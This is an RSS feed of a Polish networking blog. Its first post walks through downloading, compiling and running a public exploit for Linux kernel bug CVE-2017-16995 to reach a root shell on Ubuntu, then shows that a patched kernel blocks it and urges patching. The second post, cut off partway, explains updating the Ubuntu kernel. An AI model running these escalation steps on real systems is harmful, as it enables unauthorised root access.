@@ -1,0 +1,189 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>Linux &#8211; RSNET.PL</title>
+	<atom:link href="https://kubsoo.github.io/rsnet-website/category/linux/feed/" rel="self" type="application/rss+xml" />
+	<link>https://kubsoo.github.io/rsnet-website/</link>
+	<description>wszystko o sieciach komputerowych</description>
+	<lastBuildDate>Sat, 22 Feb 2020 11:40:47 +0000</lastBuildDate>
+	<language>pl-PL</language>
+	<sy:updatePeriod>hourly</sy:updatePeriod>
+	<sy:updateFrequency>1</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=4.9.8</generator>
+	<item>
+		<title>Exploit na jądro Linux &#8211; podniesienie uprawnień do roota</title>
+		<link>https://kubsoo.github.io/rsnet-website/exploit-na-jadro-linux-podniesienie-uprawnien-do-roota/</link>
+		<comments>https://kubsoo.github.io/rsnet-website/exploit-na-jadro-linux-podniesienie-uprawnien-do-roota/#respond</comments>
+		<pubDate>Wed, 27 Dec 2017 19:23:57 +0000</pubDate>
+		<dc:creator><![CDATA[admin]]></dc:creator>
+				<category><![CDATA[Linux]]></category>
+		<category><![CDATA[exploit]]></category>
+		<category><![CDATA[jądro]]></category>
+		<category><![CDATA[linux]]></category>
+		<category><![CDATA[podniesienie uprawnień]]></category>
+
+		<guid isPermaLink="false">https://kubsoo.github.io/rsnet-website/?p=915</guid>
+		<description><![CDATA[Pod poniższym linkiem można znaleźć gotowy exploit wykorzystujący podatność CVE-2017-16995 https://github.com/brl/grlh/blob/master/get-rekt-linux-hardened.c Podatność CVE-2017-16995 została opisana dla systemu Debian pod podanym adresem: https://security-tracker.debian.org/tracker/CVE-2017-16995 Błąd dotyczy wersji jądra &#62;= 4.9. Listę podatnych&#46;&#46;&#46;]]></description>
+				<content:encoded><![CDATA[		<div class="elementor elementor-915">
+			<div class="elementor-inner">
+				<div class="elementor-section-wrap">
+							<section data-id="e6d72c9" class="elementor-element elementor-element-e6d72c9 elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-top-section" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-default">
+				<div class="elementor-row">
+				<div data-id="8e44464" class="elementor-element elementor-element-8e44464 elementor-column elementor-col-100 elementor-top-column" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+					<div class="elementor-widget-wrap">
+				<div data-id="999319e" class="elementor-element elementor-element-999319e elementor-widget elementor-widget-text-editor" data-element_type="text-editor.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-text-editor elementor-clearfix"><p style="text-align: justify;"><span style="color: #000000;">Pod poniższym linkiem można znaleźć gotowy exploit wykorzystujący podatność CVE-2017-16995 </span></p><p style="text-align: justify;"><span style="color: #ff0000;"><a style="color: #ff0000;" href="https://github.com/brl/grlh/blob/master/get-rekt-linux-hardened.c">https://github.com/brl/grlh/blob/master/get-rekt-linux-hardened.c</a></span></p><p style="text-align: justify;"><span style="color: #000000;">Podatność CVE-2017-16995 została opisana dla systemu Debian pod podanym adresem:</span></p><p><span style="color: #ff0000;"><a style="color: #ff0000;" href="https://security-tracker.debian.org/tracker/CVE-2017-16995​">https://security-tracker.debian.org/tracker/CVE-2017-16995</a></span></p><p style="text-align: justify;"><span style="color: #000000;">Błąd dotyczy wersji jądra &gt;= 4.9. Listę podatnych jądr można znaleźć pod tym linkiem: </span></p><p style="text-align: justify;"><span style="color: #000000;"><span style="color: #ff0000;">https://www.securityfocus.com/bid/102288</span></span></p><p style="text-align: justify;"><span style="color: #000000;">Więcej informacji o podatności można znaleźć tutaj:</span></p><p><a href="http://seclists.org/oss-sec/2017/q4/429​" data-wplink-url-error="true"><span style="color: #ff0000;">http://seclists.org/oss-sec/2017/q4/429</span></a></p><h5> </h5><h5><span style="color: #000000;">EXPLOIT</span></h5><p style="text-align: justify;"><span style="color: #000000;">Jak wykorzystać exploita, pokaże na przykładzie systemu operacyjnego Ubuntu z jądrem w wersji  <strong>4.10.0-041000-generic </strong></span></p><p style="text-align: justify;"><span style="color: #000000;">Najpierw ściągnijmy kod exploita:</span></p><pre><span style="color: #000000;">kuba@Ubuntu-1:~$ <strong>wget https://raw.githubusercontent.com/brl/grlh/master/get-rekt-linux-hardened.c</strong></span><br /><span style="color: #000000;">--2017-12-28 13:03:10-- https://raw.githubusercontent.com/brl/grlh/master/get-rekt-linux-hardened.c</span><br /><span style="color: #000000;">Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.0.133, 151.101.64.133, 151.101.128.133, ...</span><br /><span style="color: #000000;">Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.0.133|:443... connected.</span><br /><span style="color: #000000;">HTTP request sent, awaiting response... 200 OK</span><br /><span style="color: #000000;">Length: 11540 (11K) [text/plain]</span><br /><span style="color: #000000;">Saving to: ‘get-rekt-linux-hardened.c’</span><br /><br /><span style="color: #000000;">get-rekt-linux-hard 100%[===================&gt;] 11.27K --.-KB/s in 0.002s</span><br /><br /><span style="color: #000000;">2017-12-28 13:03:10 (7.06 MB/s) - ‘get-rekt-linux-hardened.c’ saved [11540/11540]</span></pre><pre><span style="color: #000000;">kuba@Ubuntu-1:~$ ls -l</span><br /><span style="color: #000000;">total 148</span><br /><span style="color: #000000;">-rw-rw-r-- 1 kuba kuba 150547 Dec 28 12:55 get-rekt-linux-hardened.c</span></pre><p style="text-align: justify;"><span style="color: #000000;">Jak widać mój użytkownik to kuba, sprawdźmy wynik komendy id dla tego użytkownika:</span></p><pre><span style="color: #000000;">kuba@Ubuntu-1:~$ id</span><br /><span style="color: #000000;">uid=1000(kuba) gid=1000(kuba) groups=1000(kuba)</span></pre><p style="text-align: justify;"><span style="color: #000000;">Widzimy, że użytkownik nie jest rootem, możemy więc spróbować uruchomić exploit i zdobyć uprawnienia roota.</span></p><h5> </h5><h5><span style="color: #000000;">URUCHOMIENIE EXPLOITA</span></h5><p style="text-align: justify;"><span style="color: #000000;">Exploita musimy skompilować, a następnie uruchomić. Do kompilowania użyjemy kompilatora gcc dostępnego w systemie:</span></p><pre><span style="color: #000000;">kuba@Ubuntu-1:~$ <strong>gcc -o get-rekt-linux-hardened.o get-rekt-linux-hardened.c</strong></span><br /><span style="color: #000000;">get-rekt-linux-hardened.c: In function ‘writemsg’:</span><br /><span style="color: #000000;">get-rekt-linux-hardened.c:334:19: warning: format ‘%d’ expects argument of type ‘int’, but argument 3 has type ‘ssize_t {aka long int}’ [-Wformat=]</span><br /><span style="color: #000000;"> fprintf(stderr, "short write: %d\n", n);</span><br /><span style="color: #000000;"> ^</span><br /><span style="color: #000000;">kuba@Ubuntu-1:~$ </span></pre></div>
+				</div>
+				</div>
+						</div>
+			</div>
+		</div>
+						</div>
+			</div>
+		</section>
+				<section data-id="c128ae7" class="elementor-element elementor-element-c128ae7 elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-top-section" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-default">
+				<div class="elementor-row">
+				<div data-id="ac34797" class="elementor-element elementor-element-ac34797 elementor-column elementor-col-100 elementor-top-column" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+					<div class="elementor-widget-wrap">
+				<div data-id="a5024ce" class="elementor-element elementor-element-a5024ce elementor-widget elementor-widget-text-editor" data-element_type="text-editor.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-text-editor elementor-clearfix"><p style="text-align: justify;"><span style="color: #000000;">Przy kompilacji dostaliśmy ostrzeżenie, jednak nie musimy się nim przejmować, kod został skompilowany i w wyniku działania powyższej komendy otrzymaliśmy plik: <em>get-rekt-linux-hardened.o</em></span></p><p style="text-align: justify;"><span style="color: #000000;">Teraz pozostało tylko uruchomienie pliku:</span></p><pre><span style="color: #000000;">kuba@Ubuntu-1:~$ ./get-rekt-linux-hardened.o</span><br /><span style="color: #000000;">[.]</span><br /><span style="color: #000000;">[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)</span><br /><span style="color: #000000;">[.]</span><br /><span style="color: #000000;">[.] ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **</span><br /><span style="color: #000000;">[.]</span><br /><span style="color: #000000;">[*] creating bpf map</span><br /><span style="color: #000000;">[*] sneaking evil bpf past the verifier</span><br /><span style="color: #000000;">[*] creating socketpair()</span><br /><span style="color: #000000;">[*] attaching bpf backdoor to socket</span><br /><span style="color: #000000;">[*] Leaking sock struct from ffff9a4db123d800</span><br /><span style="color: #000000;">[*] found sock-&gt;sk_rcvtimeo at offset 592</span><br /><span style="color: #000000;">[*] found sock-&gt;sk_peer_cred</span><br /><span style="color: #000000;">[*] hammering cred structure at ffff9a4db78f46c0</span><br /><span style="color: #000000;">[*] credentials patched, launching shell...</span><br /><span style="color: #000000;">#</span></pre></div>
+				</div>
+				</div>
+						</div>
+			</div>
+		</div>
+						</div>
+			</div>
+		</section>
+				<section data-id="926fa44" class="elementor-element elementor-element-926fa44 elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-top-section" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-default">
+				<div class="elementor-row">
+				<div data-id="bcf2392" class="elementor-element elementor-element-bcf2392 elementor-column elementor-col-100 elementor-top-column" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+					<div class="elementor-widget-wrap">
+				<div data-id="ce5893c" class="elementor-element elementor-element-ce5893c elementor-widget elementor-widget-text-editor" data-element_type="text-editor.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-text-editor elementor-clearfix"><p style="text-align: justify;"><span style="color: #000000;">Udało się !. Znak # sugeruje że jesteśmy teraz w shellu roota, sprawdźmy to wykonując komendę id:</span></p><pre><span style="color: #000000;"># id</span><br /><span style="color: #000000;">uid=0(root) gid=0(root) groups=0(root)</span></pre></div>
+				</div>
+				</div>
+						</div>
+			</div>
+		</div>
+						</div>
+			</div>
+		</section>
+				<section data-id="1c1ce18" class="elementor-element elementor-element-1c1ce18 elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-top-section" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-default">
+				<div class="elementor-row">
+				<div data-id="4c1587d" class="elementor-element elementor-element-4c1587d elementor-column elementor-col-100 elementor-top-column" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+					<div class="elementor-widget-wrap">
+				<div data-id="9e115ed" class="elementor-element elementor-element-9e115ed elementor-widget elementor-widget-text-editor" data-element_type="text-editor.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-text-editor elementor-clearfix"><h5><span style="color: #000000;">PODSUMOWANIE</span></h5><p style="text-align: justify;"><span style="color: #000000;">Jest to świeży BUG (został upubliczniony 21.12.2017). W momencie pisania tego artykułu istnieje załatane jądro do Ubuntu w wersji 4.15-rc5. Jak zaktualizować jądro pokazywałem we wpisie:</span> <a href="https://kubsoo.github.io/rsnet-website/ubuntu-aktualizacja-jadra-na-szybko/">https://kubsoo.github.io/rsnet-website/ubuntu-aktualizacja-jadra-na-szybko/</a></p></div>
+				</div>
+				</div>
+						</div>
+			</div>
+		</div>
+						</div>
+			</div>
+		</section>
+				<section data-id="119d92c" class="elementor-element elementor-element-119d92c elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-top-section" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-default">
+				<div class="elementor-row">
+				<div data-id="8d8ecd5" class="elementor-element elementor-element-8d8ecd5 elementor-column elementor-col-100 elementor-top-column" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+					<div class="elementor-widget-wrap">
+				<div data-id="3e2a149" class="elementor-element elementor-element-3e2a149 elementor-widget elementor-widget-text-editor" data-element_type="text-editor.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-text-editor elementor-clearfix"><p style="text-align: justify;"><span style="color: #000000;">Sprawdźmy jak zachowa się ten sam exploit na zaktualizowanym jądrze:</span></p><pre style="text-align: justify;"><span style="color: #000000;">kuba@Ubuntu-1:~$ uname -a</span><br /><span style="color: #000000;">Linux Ubuntu-1 <strong>4.15.0-041500rc5-generic</strong> #201712240530 SMP Sun Dec 24 05:31:14 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span></pre><pre><span style="color: #000000;">kuba@Ubuntu-1:~$ ./get-rekt-linux-hardened.o</span><br /><span style="color: #000000;">[.]</span><br /><span style="color: #000000;">[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)</span><br /><span style="color: #000000;">[.]</span><br /><span style="color: #000000;">[.] ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **</span><br /><span style="color: #000000;">[.]</span><br /><span style="color: #000000;">[*] creating bpf map</span><br /><span style="color: #000000;">[*] sneaking evil bpf past the verifier</span><br /><span style="color: #000000;">[*] log:</span><br /><span style="color: #000000;">0: (b4) (u32) r2 = (u32) -1</span><br /><span style="color: #000000;">1: (55) if r2 != 0xffffffff goto pc+2</span><br /><span style="color: #000000;"> R1=ctx(id=0,off=0,imm=0) R2=inv-1 R10=fp0</span><br /><span style="color: #000000;">2: (b7) r0 = 0</span><br /><span style="color: #000000;">3: (95) exit</span><br /><br /><span style="color: #000000;">from 1 to 4: R1=ctx(id=0,off=0,imm=0) R2=inv4294967295 R10=fp0</span><br /><span style="color: #000000;">4: (7b) *(u64 *)(r10 -16) = r1</span><br /><span style="color: #000000;">5: (18) r9 = 0x0</span><br /><span style="color: #000000;">7: (bf) r1 = r9</span><br /><span style="color: #000000;">8: (bf) r2 = r10</span><br /><span style="color: #000000;">9: (07) r2 += -4</span><br /><span style="color: #000000;">10: (62) *(u32 *)(r10 -4) = 0</span><br /><span style="color: #000000;">11: (85) call bpf_map_lookup_elem#1</span><br /><span style="color: #000000;">12: (55) if r0 != 0x0 goto pc+1</span><br /><span style="color: #000000;"> R0=inv0 R9=map_ptr(id=0,off=0,ks=4,vs=8) R10=fp0 fp-504=ctx</span><br /><span style="color: #000000;">13: (95) exit</span><br /><br /><span style="color: #000000;">from 12 to 14: R0=map_value(id=0,off=0,ks=4,vs=8,imm=0) R9=map_ptr(id=0,off=0,ks=4,vs=8) R10=fp0 fp-504=ctx</span><br /><span style="color: #000000;">14: (79) r6 = *(u64 *)(r0 +0)</span><br /><span style="color: #000000;"> R0=map_value(id=0,off=0,ks=4,vs=8,imm=0) R9=map_ptr(id=0,off=0,ks=4,vs=8) R10=fp0 fp-504=ctx</span><br /><span style="color: #000000;">15: (bf) r1 = r9</span><br /><span style="color: #000000;">16: (bf) r2 = r10</span><br /><span style="color: #000000;">17: (07) r2 += -4</span><br /><span style="color: #000000;">18: (62) *(u32 *)(r10 -4) = 1</span><br /><span style="color: #000000;">19: (85) call bpf_map_lookup_elem#1</span><br /><span style="color: #000000;">20: (55) if r0 != 0x0 goto pc+1</span><br /><span style="color: #000000;"> R0=inv0 R6=inv(id=0) R9=map_ptr(id=0,off=0,ks=4,vs=8) R10=fp0 fp-504=ctx</span><br /><span style="color: #000000;">21: (95) exit</span><br /><br /><span style="color: #000000;">from 20 to 22: R0=map_value(id=0,off=0,ks=4,vs=8,imm=0) R6=inv(id=0) R9=map_ptr(id=0,off=0,ks=4,vs=8) R10=fp0 fp-504=ctx</span><br /><span style="color: #000000;">22: (79) r7 = *(u64 *)(r0 +0)</span><br /><span style="color: #000000;"> R0=map_value(id=0,off=0,ks=4,vs=8,imm=0) R6=inv(id=0) R9=map_ptr(id=0,off=0,ks=4,vs=8) R10=fp0 fp-504=ctx</span><br /><span style="color: #000000;">23: (bf) r1 = r9</span><br /><span style="color: #000000;">24: (bf) r2 = r10</span><br /><span style="color: #000000;">25: (07) r2 += -4</span><br /><span style="color: #000000;">26: (62) *(u32 *)(r10 -4) = 2</span><br /><span style="color: #000000;">27: (85) call bpf_map_lookup_elem#1</span><br /><span style="color: #000000;">28: (55) if r0 != 0x0 goto pc+1</span><br /><span style="color: #000000;"> R0=inv0 R6=inv(id=0) R7=inv(id=0) R9=map_ptr(id=0,off=0,ks=4,vs=8) R10=fp0 fp-504=ctx</span><br /><span style="color: #000000;">29: (95) exit</span><br /><br /><span style="color: #000000;">from 28 to 30: R0=map_value(id=0,off=0,ks=4,vs=8,imm=0) R6=inv(id=0) R7=inv(id=0) R9=map_ptr(id=0,off=0,ks=4,vs=8) R10=fp0 fp-504=ctx</span><br /><span style="color: #000000;">30: (79) r8 = *(u64 *)(r0 +0)</span><br /><span style="color: #000000;"> R0=map_value(id=0,off=0,ks=4,vs=8,imm=0) R6=inv(id=0) R7=inv(id=0) R9=map_ptr(id=0,off=0,ks=4,vs=8) R10=fp0 fp-504=ctx</span><br /><span style="color: #000000;">31: (bf) r2 = r0</span><br /><span style="color: #000000;">32: (b7) r0 = 0</span><br /><span style="color: #000000;">33: (55) if r6 != 0x0 goto pc+2</span><br /><span style="color: #000000;"> R0=inv0 R2=map_value(id=0,off=0,ks=4,vs=8,imm=0) R6=inv0 R7=inv(id=0) R8=inv(id=0) R9=map_ptr(id=0,off=0,ks=4,vs=8) R10=fp0 fp-504=ctx</span><br /><span style="color: #000000;">34: (7b) *(u64 *)(r2 +0) = r10</span><br /><span style="color: #000000;">R10 leaks addr into map</span><br /><span style="color: #000000;">[!] failed to load prog 'Permission denied'</span><br /><br /><br /></pre><p style="text-align: justify;"><span style="color: #000000;">Jak widać jądro w wersji 4.15.0-041500rc5-generic jest odporne na tego exploita, więc zachęcam do szybkiego patchowania.</span></p></div>
+				</div>
+				</div>
+						</div>
+			</div>
+		</div>
+						</div>
+			</div>
+		</section>
+						</div>
+			</div>
+		</div>
+		]]></content:encoded>
+			<wfw:commentRss>https://kubsoo.github.io/rsnet-website/exploit-na-jadro-linux-podniesienie-uprawnien-do-roota/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>Ubuntu aktualizacja jądra &#8211; na szybko</title>
+		<link>https://kubsoo.github.io/rsnet-website/ubuntu-aktualizacja-jadra-na-szybko/</link>
+		<comments>https://kubsoo.github.io/rsnet-website/ubuntu-aktualizacja-jadra-na-szybko/#respond</comments>
+		<pubDate>Wed, 13 Dec 2017 21:35:33 +0000</pubDate>
+		<dc:creator><![CDATA[admin]]></dc:creator>
+				<category><![CDATA[Linux]]></category>
+		<category><![CDATA[Na szybko]]></category>
+		<category><![CDATA[linux]]></category>
+		<category><![CDATA[na szybko]]></category>
+		<category><![CDATA[Poradnik]]></category>
+		<category><![CDATA[ubuntu]]></category>
+
+		<guid isPermaLink="false">https://kubsoo.github.io/rsnet-website/?p=846</guid>
+		<description><![CDATA[Przed przystąpieniem do aktualizacji jądra sprawdźmy jaką wersję jądra posiadamy, służy do tego komenda uname -a: kuba@Ubuntu-1:~$ uname -aLinux Ubuntu-1 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64&#46;&#46;&#46;]]></description>
+				<content:encoded><![CDATA[		<div class="elementor elementor-846">
+			<div class="elementor-inner">
+				<div class="elementor-section-wrap">
+							<section data-id="b811140" class="elementor-element elementor-element-b811140 elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-top-section" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-default">
+				<div class="elementor-row">
+				<div data-id="244f850" class="elementor-element elementor-element-244f850 elementor-column elementor-col-100 elementor-top-column" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+					<div class="elementor-widget-wrap">
+				<div data-id="6c332d3" class="elementor-element elementor-element-6c332d3 elementor-widget elementor-widget-text-editor" data-element_type="text-editor.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-text-editor elementor-clearfix"><div><span style="color: #000000;">Przed przystąpieniem do aktualizacji jądra sprawdźmy jaką wersję jądra posiadamy, służy do tego komenda uname -a:</span></div><div><pre><span style="color: #000000;">kuba@Ubuntu-1:~$ uname -a</span><br /><span style="color: #000000;">Linux Ubuntu-1 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span></pre></div><div><span style="color: #000000;">Wersja jądra to 4.4.0-104-generic</span></div><div> </div><div style="text-align: justify;"><span style="color: #000000;">W celu aktualizacji jądra w systemie Ubuntu wchodzimy na stronę:</span> <a href="http://kernel.ubuntu.com/~kernel-ppa/mainline/">http://kernel.ubuntu.com/~kernel-ppa/mainline/</a></div><div style="text-align: justify;"><span style="color: #000000;">wybieramy wersję jądra (ja wybrałem wersję v4.10). Po kliknięciu w odpowiednią wersję zostaniemy przekierowani na stronę:</span></div><div><a href="http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.10/">http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.10/</a></div><div style="text-align: justify;"><span style="color: #000000;">gdzie mamy pliki dla odpowiednich platform sprzętowych. Ja posiadam procesor z architekturą 64 bitową, więc szukam plików dla tej architektury:</span></div><div> </div><pre><span style="color: #000000;">Build for amd64 succeeded (see</span> <a href="http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.10/BUILD.LOG.amd64):">BUILD.LOG.amd64):</a><br />  <a href="http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.10/linux-headers-4.10.0-041000_4.10.0-041000.201702191831_all.deb">linux-headers-4.10.0-041000_4.10.0-041000.201702191831_all.deb</a><br />  <a href="http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.10/linux-headers-4.10.0-041000-generic_4.10.0-041000.201702191831_amd64.deb">linux-headers-4.10.0-041000-generic_4.10.0-041000.201702191831_amd64.deb</a><br />  <a href="http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.10/linux-headers-4.10.0-041000-lowlatency_4.10.0-041000.201702191831_amd64.deb">linux-headers-4.10.0-041000-lowlatency_4.10.0-041000.201702191831_amd64.deb</a><br />  <a href="http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.10/linux-image-4.10.0-041000-generic_4.10.0-041000.201702191831_amd64.deb">linux-image-4.10.0-041000-generic_4.10.0-041000.201702191831_amd64.deb</a><br />  <a href="http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.10/linux-image-4.10.0-041000-lowlatency_4.10.0-041000.201702191831_amd64.deb">linux-image-4.10.0-041000-lowlatency_4.10.0-041000.201702191831_amd64.deb</a></pre><div><span style="color: #000000;">Nas interesują tylko poniższe trzy pliki:</span></div><div> </div><div><p><a href="http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.10/linux-image-4.10.0-041000-generic_4.10.0-041000.201702191831_amd64.deb">linux-image-4.10.0-041000-generic_4.10.0-041000.201702191831_amd64.deb</a></p><p><a href="http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.10/linux-headers-4.10.0-041000_4.10.0-041000.201702191831_all.deb">linux-headers-4.10.0-041000_4.10.0-041000.201702191831_all.deb</a></p></div><p><a href="http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.10/linux-image-4.10.0-041000-generic_4.10.0-041000.201702191831_amd64.deb">linux-image-4.10.0-041000-generic_4.10.0-041000.201702191831_amd64.deb</a></p><div> </div><div><span style="color: #000000;">Powyższe pliki ściągamy na nasz komputer korzystając z komendy wget:</span></div><pre><span style="color: #000000;">wget <a style="color: #000000;" href="http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.10/linux-headers-4.10.0-041000_4.10.0-041000.201702191831_all.deb">http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.10/linux-headers-4.10.0-041000_4.10.0-041000.201702191831_all.deb</a></span><br /><span style="color: #000000;">wget <a style="color: #000000;" href="http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.10/linux-headers-4.10.0-041000-generic_4.10.0-041000.201702191831_amd64.deb">http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.10/linux-headers-4.10.0-041000-generic_4.10.0-041000.201702191831_amd64.deb</a></span><br /><span style="color: #000000;">wget <a style="color: #000000;" href="http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.10/linux-image-4.10.0-041000-generic_4.10.0-041000.201702191831_amd64.deb">http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.10/linux-image-4.10.0-041000-generic_4.10.0-041000.201702191831_amd64.deb</a></span></pre><div><span style="color: #000000;">Jak mamy wszystkie 3 pliki ściągnięte:</span></div><pre><span style="color: #000000;">kuba@Ubuntu-1:~$ ls</span><br /><span style="color: #000000;">linux-headers-4.10.0-041000-generic_4.10.0-041000.201702191831_amd64.deb</span><br /><span style="color: #000000;">linux-headers-4.10.0-041000_4.10.0-041000.201702191831_all.deb</span><br /><span style="color: #000000;">linux-image-4.10.0-041000-generic_4.10.0-041000.201702191831_amd64.deb</span></pre><div style="text-align: justify;"><span style="color: #000000;">to przechodzimy do ich instalacji. W tym celu wykonujemy poniższą komendę:</span></div><pre><span style="color: #000000;">kuba@Ubuntu-1:~$ sudo dpkg-i *.deb</span></pre><div style="text-align: justify;"><span style="color: #000000;">Jeśli wszystko przebiegło poprawnie i nie dostaliśmy żadnego błędu, możemy zrestartować urządzenie. Po restarcie system powinien wystartować z nowym zaktualizowanym jądrem.</span></div><pre><span style="color: #000000;">root@Ubuntu-1:~# reboot</span></pre><div><span style="color: #000000;">Po restarcie sprawdźmy wersję jądra:</span></div><pre><span style="color: #000000;">kuba@Ubuntu-1:~$ uname -a</span><br /><span style="color: #000000;">Linux Ubuntu-1 <strong>4.10.0-041000-generic</strong> #201702191831 SMP Sun Feb 19 23:33:19 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span></pre><div style="text-align: justify;"><span style="color: #000000;">Widzimy, że aktualizacja przebiegła poprawnie i system korzysta z jądra w wersji <strong>4.10.0-041000-generic.</strong></span></div><div> </div><div style="text-align: justify;"> </div></div>
+				</div>
+				</div>
+						</div>
+			</div>
+		</div>
+						</div>
+			</div>
+		</section>
+				<section data-id="38d00a4" class="elementor-element elementor-element-38d00a4 elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-top-section" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-default">
+				<div class="elementor-row">
+				<div data-id="deab850" class="elementor-element elementor-element-deab850 elementor-column elementor-col-100 elementor-top-column" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+					<div class="elementor-widget-wrap">
+				<div data-id="4e905b3" class="elementor-element elementor-element-4e905b3 elementor-widget elementor-widget-text-editor" data-element_type="text-editor.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-text-editor elementor-clearfix"><h5><span style="color: #000000;">AUTOMATYZACJA</span></h5><p style="text-align: justify;"><span style="color: #000000;">Skrypt to automatycznej aktualizacji jądra dla systemów Ubuntu i Debian można znaleźć pod poniższym linkiem:</span></p><p style="text-align: justify;"><span style="color: #ff0000;"><a style="color: #ff0000;" href="https://gist.github.com/kubsoo/36b16278ece326dacc487bc68140a4be">https://gist.github.com/kubsoo/36b16278ece326dacc487bc68140a4be</a></span></p><p style="text-align: justify;"><span style="color: #000000;">Jest to skrypt Python, który działa następująco:</span></p><ol><li><span style="color: #000000;">sprawdza architekturę systemu i obecnie zainstalowaną wersje systemu</span></li><li><span style="color: #000000;">sprawdza na stronie: http://kernel.ubuntu.com/~kernel-ppa/mainline jaka jest najnowsza wersja systemu</span></li><li><span style="color: #000000;">porównuje tą wersję z zainstalowaną wersją i jeśli się różnią to ściąga odpowiednie pliki dla najnowszej wersji</span></li><li><span style="color: #000000;">instaluje najnowszą wersję systemu</span></li><li><span style="color: #000000;">restartuje system</span></li></ol><p> </p><p style="text-align: justify;"><span style="color: #000000;">Wynik działania skryptu wygląda następująco:</span></p><pre><span style="color: #000000;">root@ubuntu-2:/home/kuba# <strong>./update_kernel.py</strong></span><br /><span style="color: #0000ff;"><strong>System Architecture is amd64</strong></span><br /><span style="color: #0000ff;"><strong>Kernel version is 4.13.0-21-generic</strong></span><br /><span style="color: #0000ff;"><strong>Found new kernel version 4.15.0-041500rc6</strong></span><br /><span style="color: #0000ff;"><strong>Proceed with download Y/n: Y</strong></span><br /><span style="color: #000000;">--2018-01-07 21:21:15-- http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.15-rc6/linux-headers-4.15.0-041500rc6_4.15.0-041500rc6.201712312330_all.deb</span><br /><span style="color: #000000;">Translacja kernel.ubuntu.com (kernel.ubuntu.com)... 91.189.94.216</span><br /><span style="color: #000000;">Łączenie się z kernel.ubuntu.com (kernel.ubuntu.com)|91.189.94.216|:80... połączono.</span><br /><span style="color: #000000;">Żądanie HTTP wysłano, oczekiwanie na odpowiedź... 200 OK</span><br /><span style="color: #000000;">Długość: 10864312 (10M) [application/x-debian-package]</span><br /><span style="color: #000000;">Zapis do: `linux-headers-4.15.0-041500rc6_4.15.0-041500rc6.201712312330_all.deb.1'</span><br /><br /><span style="color: #000000;">linux-headers-4.15. 100%[===================&gt;] 10,36M 5,85MB/s w 1,8s</span><br /><br /><span style="color: #000000;">2018-01-07 21:21:17 (5,85 MB/s) - zapisano `linux-headers-4.15.0-041500rc6_4.15.0-041500rc6.201712312330_all.deb.1' [10864312/10864312]</span><br /><br /><span style="color: #000000;">--2018-01-07 21:21:17-- http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.15-rc6/linux-headers-4.15.0-041500rc6-generic_4.15.0-041500rc6.201712312330_amd64.deb</span><br /><span style="color: #000000;">Translacja kernel.ubuntu.com (kernel.ubuntu.com)... 91.189.94.216</span><br /><span style="color: #000000;">Łączenie się z 